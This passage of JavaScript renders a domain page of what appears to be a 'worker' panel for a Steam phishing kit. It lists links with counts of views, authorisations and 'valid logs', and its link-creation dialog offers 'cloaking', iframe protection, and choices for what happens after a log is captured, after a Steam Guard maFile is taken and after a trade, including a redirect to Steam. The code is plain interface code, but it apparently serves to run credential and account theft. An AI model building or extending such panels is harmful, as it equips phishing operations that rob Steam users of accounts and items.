        ${renderMiniStat(WorkerI18n.t("sites.views"), stats.views || 0, "views")}
        ${renderMiniStat(WorkerI18n.t("sites.validLogs"), stats.logs || 0, "logs")}
      </div>
      <div class="site-domain-meta">
        <span class="muted">${WorkerI18n.t("sites.createdAt")}:</span> ${WorkerFormat.escapeHtml(WorkerFormat.shortDayTime(d.createdAt))}
        <span class="site-domain-meta-sep">·</span>
        ${renderBindMeta(d)}
      </div>
    </section>

    <section class="section">
      <div class="section-head">
        <h2 class="section-title">${WorkerI18n.t("sites.linksTitle")}</h2>
        ${domainPaused ? "" : `<button type="button" class="btn btn-primary" id="siteAddLink">${WorkerI18n.t("sites.createLink")}</button>`}
      </div>
      ${domainPaused ? "" : ""}
      ${
        links.length
          ? `<div class="table-wrap">
              <table class="data">
                <thead>
                  <tr>
                    <th>${WorkerI18n.t("sites.colLink")}</th>
                    <th>${WorkerI18n.t("sites.colAuthType")}</th>
                    <th class="col-num">${WorkerI18n.t("sites.views")}</th>
                    <th class="col-num">${WorkerI18n.t("sites.auths")}</th>
                    <th class="col-num">${WorkerI18n.t("sites.validLogs")}</th>
                    <th class="col-actions"></th>
                  </tr>
                </thead>
                <tbody>${links.map((link) => renderLinkRow(link, d.domain)).join("")}</tbody>
              </table>
            </div>`
          : `<div class="table-empty">${WorkerI18n.t("sites.linksEmptyTitle")}<br /><span class="muted">${WorkerI18n.t("sites.linksEmptyHint")}</span>${
              domainPaused
                ? ""
                : `<br /><button type="button" class="btn btn-ghost site-empty-add" id="siteEmptyAdd">${WorkerI18n.t("sites.createLink")}</button>`
            }</div>`
      }
    </section>

    ${d.isOwn ? `<div class="sites-detail-danger"><button type="button" class="btn btn-danger" id="domainDelete">${WorkerI18n.t("sites.deleteDomain")}</button></div>` : ""}

    <dialog class="sites-dialog sites-dialog-wide" id="linkFormDialog">
      <div class="sites-dialog-body link-create-body">
        <h3 class="sites-dialog-title" id="linkFormTitle">${WorkerI18n.t("sites.linkCreateTitle")}</h3>
        <div class="link-segments">
          <button type="button" class="link-segment is-active" data-link-tab="main">${WorkerI18n.t("sites.tabMain")}</button>
          <button type="button" class="link-segment" data-link-tab="advanced">${WorkerI18n.t("sites.tabAdvanced")}</button>
        </div>
        <div class="link-create-panel" data-link-panel="main">
          <div class="link-field">
            <div class="link-field-label">
              <span>${WorkerI18n.t("sites.pathLabel")}</span>
              <span class="muted">${WorkerI18n.t("sites.optional")}</span>
            </div>
            <div class="link-path-input">
              <span class="link-path-prefix">${WorkerFormat.escapeHtml(d.domain)}/</span>
              <input class="input link-path-field" id="linkPathInput" autocomplete="off" />
            </div>
          </div>
          <div class="link-field">
            <div class="link-field-label"><span>${WorkerI18n.t("sites.templateLabel")}</span></div>
            <button type="button" class="link-template-btn" id="linkTemplateOpen">
              <span id="linkTemplateValue">${WorkerI18n.t("sites.templateNotSelected")}</span>
              <svg viewBox="0 0 24 24" fill="none"><path d="M9 6l6 6-6 6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
            </button>
          </div>
          <div class="link-field">
            <div class="link-field-label"><span>${WorkerI18n.t("sites.windowLabel")}</span></div>
            <div id="linkWindowSelect" class="custom-select-host"></div>
          </div>
        </div>
        <div class="link-create-panel" data-link-panel="advanced" hidden>
          <div class="link-advanced-block">
            <div class="link-advanced-title">${WorkerI18n.t("sites.advancedProtection")}</div>
            <label class="link-check"><input type="checkbox" id="linkOptIframe" checked /> ${WorkerI18n.t("sites.useIframe")}</label>
            <label class="link-check"><input type="checkbox" id="linkOptCloaking" /> ${WorkerI18n.t("sites.cloaking")}</label>
          </div>
          <div class="link-advanced-block">
            <div class="link-advanced-title">${WorkerI18n.t("sites.afterLog")}</div>
            <label class="link-radio"><input type="radio" name="logAction" value="error" checked /> ${WorkerI18n.t("sites.actionError")}</label>
            <label class="link-radio"><input type="radio" name="logAction" value="redirect" /> ${WorkerI18n.t("sites.actionRedirect")}</label>
          </div>
          <div class="link-advanced-block">
            <div class="link-advanced-title">${WorkerI18n.t("sites.afterMafile")}</div>
            <label class="link-radio"><input type="radio" name="mafileAction" value="error" /> ${WorkerI18n.t("sites.actionError")}</label>
            <label class="link-radio"><input type="radio" name="mafileAction" value="redirect" checked /> ${WorkerI18n.t("sites.mafileRedirectSteam")}</label>
          </div>
          <div class="link-advanced-block">
            <div class="link-advanced-title">${WorkerI18n.t("sites.afterTrade")}</div>
            <label class="link-radio"><input type="radio" name="tradeAction" value="error" checked /> ${WorkerI18n.t("sites.actionError")}</label>
            <label class="link-radio"><input type="radio" name="tradeAction" value="redirect" /> ${WorkerI18n.t("sites.actionRedirect")}</label>
          </div>
        </div>
        <div class="sites-dialog-actions sites-dialog-actions-stack">
          <button type="button" class="btn btn-primary" id="linkFormSubmit">${WorkerI18n.t("sites.submitAdd")}</button>
          <button type="button" class="btn btn-ghost" id="linkFormCancel">${WorkerI18n.t("sites.cancel")}</button>
        </div>
      </div>
    </dialog>

    <dialog class="sites-dialog sites-dialog-wide" id="templatePickDialog">
      <div class="sites-dialog-body">
        <h3 class="sites-dialog-title">${WorkerI18n.t("sites.templatePickTitle")}</h3>
        <p class="muted sites-dialog-sub">${WorkerI18n.t("sites.templatePickHint")}</p>
        <label class="sites-search sites-search-compact">
          <svg viewBox="0 0 24 24" fill="none"><circle cx="11" cy="11" r="6.5" stroke="currentColor" stroke-width="1.5"/><path d="M16 16l4 4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
          <input type="search" id="templatePickSearch" placeholder="${WorkerI18n.t("sites.templateSearch")}" autocomplete="off" />
        </label>
        <div class="template-pick-list" id="templatePickGrid"></div>
        <div class="sites-dialog-actions">
          <button type="button" class="btn btn-primary" id="templatePickSelect">${WorkerI18n.t("sites.templateSelect")}</button>
          <button type="button" class="btn btn-ghost" id="templatePickBack">${WorkerI18n.t("sites.templateBack")}</button>
        </div>
      </div>
    </dialog>
  `;

    document.getElementById("sitesBack").addEventListener("click", () => {
      WorkerViews.sitesState.selectedId = null;
      WorkerViews.sites(ctx);
    });

    const refreshDetail = () => renderSiteDetail(main, domainId, { ...ctx, refresh: true });
    const linkModal = mountLinkFormModal({
      templates,
      domainId,
      domainPaused,
      onSaved: refreshDetail,
    });

    ["siteAddLink", "siteEmptyAdd"].forEach((id) => {
      document.getElementById(id)?.addEventListener("click", () => linkModal.openCreate());
    });

    main.querySelectorAll("tr[data-link-id]").forEach((row) => {
      const linkId = Number(row.dataset.linkId);
      const link = links.find((item) => Number(item.id) === linkId);
      if (!link) return;
      mountLinkActionsMenu(
        row.querySelector(".link-actions-host"),
        link,
        {
          onEdit: (item) => linkModal.openEdit(item),
          onDelete: async (item) => {
            if (!confirm(WorkerI18n.t("sites.deleteLinkConfirm"))) return;
            try {
              await WorkerAPI.del(`/sites/domains/${domainId}/links/${item.id}`);
              await refreshDetail();
            } catch (error) {
              alert(error.message || WorkerI18n.t("common.error"));
            }
          },
        },
        { domainPaused }
      );
    });

    document.getElementById("domainDelete")?.addEventListener("click", async () => {
      if (!confirm(WorkerI18n.t("sites.deleteConfirm", { domain: d.domain }))) return;
      try {
        await WorkerAPI.del(`/sites/domains/${domainId}`);
        WorkerViews.sitesState.selectedId = null;
        await WorkerViews.sites(ctx);
      } catch (error) {
        alert(error.message || WorkerI18n.t("common.error"));
      }
    });
  } catch (error) {
    if (window.WorkerToast) WorkerToast.error(error);
    WorkerViews.sitesState.selectedId = null;
    await renderSitesList(main, ctx);
  }
}
